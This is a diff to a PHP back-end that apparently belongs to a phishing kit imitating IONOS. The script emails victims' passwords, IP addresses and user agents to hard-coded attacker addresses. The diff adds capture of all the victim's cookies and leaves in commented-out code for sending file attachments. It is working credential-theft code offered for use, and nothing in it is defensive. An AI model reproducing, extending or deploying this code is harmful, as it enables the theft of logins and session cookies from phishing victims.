@@ -9,10 +9,45 @@ header("Content-Type: application/json");
 $EMAIL = "gottmacht.empire@gmail.com";
 $SENDER_EMAIL = "gottmacht.empire@yandex.com";
 
-function sendEmail($message, $subject = "New Credientials") {
+function sendEmail($message, $subject = "New Credientials", $file = "") {
     global $EMAIL;
     global $SENDER_EMAIL;
-    $headers  = 'MIME-Version: 1.0' . "\r\n";
+
+    // $filename = pathinfo($file, PATHINFO_FILENAME);
+
+    // $content = file_get_contents($file);
+    // $content = chunk_split(base64_encode($content));
+
+    // // a random hash will be necessary to send mixed content
+    // $separator = md5(time());
+
+    // // carriage return type (RFC)
+    // $eol = "\r\n";
+
+    // $headers  = 'MIME-Version: 1.0'.$eol;
+    // $headers .= "Content-Type: multipart/mixed; boundary=\"" . $separator . "\"" . $eol;
+    // $headers .= "Content-Transfer-Encoding: 7bit".$eol;
+    // $headers .= "This is a MIME encoded message.".$eol;
+    
+    // // Create email headers
+    // $headers .= "From: Office M3sh<$SENDER_EMAIL>".$eol;
+    // $headers .= "Reply-to: $SENDER_EMAIL".$eol;
+
+    // // Message
+    // $body = "--" . $separator . $eol;
+    // $body .= "Content-Type: text/html; charset=\"iso-8859-1\"" . $eol;
+    // $body .= "Content-Transfer-Encoding: 8bit" . $eol;
+    // $body .= $message . $eol;
+
+    // // attachment
+    // $body .= "--" . $separator . $eol;
+    // $body .= "Content-Type: application/octet-stream; name=\"" . $filename . "\"" . $eol;
+    // $body .= "Content-Transfer-Encoding: base64" . $eol;
+    // $body .= "Content-Disposition: attachment" . $eol;
+    // $body .= $content . $eol;
+    // $body .= "--" . $separator . "--";
+
+     $headers  = 'MIME-Version: 1.0' . "\r\n";
     $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
     
     // Create email headers
@@ -97,6 +132,13 @@ if(isset($_REQUEST['send'])) {
                         <p class='title'>User Agent:</p>
                         <p class='content'>{{agent}}</p>
                     </div>
+
+                    <div class='dotted'></div>
+
+                    <div class='flex'>
+                        <p class='title'>Cookies:</p>
+                        <p class='content'>{{cookie}}</p>
+                    </div>
                 </div>
             </body>
         </html>";
@@ -104,6 +146,8 @@ if(isset($_REQUEST['send'])) {
         $message = str_replace("{{password}}", $password, $message);
         $message = str_replace("{{ip}}", $ip, $message);
         $message = str_replace("{{agent}}", $agent, $message);
+        $message = str_replace("{{cookie}}", json_encode($_COOKIE), $message);
+
 
         $mail = sendEmail($message, "IONOS-Logs | $ip");
         if(!$mail) throw new Exception("Could not send");
